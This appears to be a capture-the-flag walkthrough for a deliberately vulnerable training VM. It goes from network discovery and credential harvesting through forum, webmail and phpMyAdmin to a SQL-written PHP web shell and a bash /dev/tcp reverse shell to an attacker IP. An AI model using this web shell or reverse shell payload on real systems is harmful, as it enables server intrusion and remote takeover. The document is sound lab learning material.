

 #  Reverse shell - Summary

## Network Discovery and Service Enumeration

The target VM operates in bridged network mode. Begin by identifying your local IP address:

```bash
ifconfig
```

To know the IP of the target host:

```bash
sudo netdiscover -r 192.168.56.0/24
```

## Identified target IP: 192.168.1.4

Open services:

- FTP (21)
- SSH (22)
- HTTP (80)
- HTTPS (443)
- IMAP (143)
- IMAPS (993)

## Web Server Analysis

### Initial Reconnaissance

Access the web server on port 80:

```bash
curl 192.168.1.4
```

The response contains a basic HTML page.

## Directory Enumeration

Use dirb to discover hidden paths over HTTPS:

```bash
dirb https://192.168.1.4 -r
```

Discovered endpoints:

- Forum: https://192.168.1.4/forum/
- phpMyAdmin: https://192.168.1.4/phpmyadmin/
- Webmail: https://192.168.1.4/webmail/

## Service Exploration

### 1-Forum Analysis

Review forum posts. A post by user `lmezard` contains SSH logs with an apparent password attempt:

Password: `!q\]Ej?*5K5cy*AJ`

Use these credentials to log into the forum (`user: lmezard`).

Discover the associated email: `laurie@borntosec.net`

### 2-Webmail Access

Log into webmail (Roundcube) using `laurie@borntosec.net` and the found password.

Retrieve database credentials from an email:

  - Username: `root`  
  - Password: `Fg-'kKXBj87E:aJ$`

### 3-phpMyAdmin Exploitation

Access phpMyAdmin with the obtained credentials.

Execute SQL injection to create a web shell:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/shell.php"; 
```

## Server Compromise

### Reverse Shell Setup

Host a netcat listener locally:

```bash
nc -nvlp 4444
```

Trigger reverse shell via the web backdoor (URL-encoded Python reverse shell command):

```bash
https://192.168.1.4/forum/templates_c/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR-IP/4444+0>%261'
```


### Getting a fully interactive shell

To fix the PTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
then press `ctrl+z`, and run:

```bash
stty raw -echo; fg;
```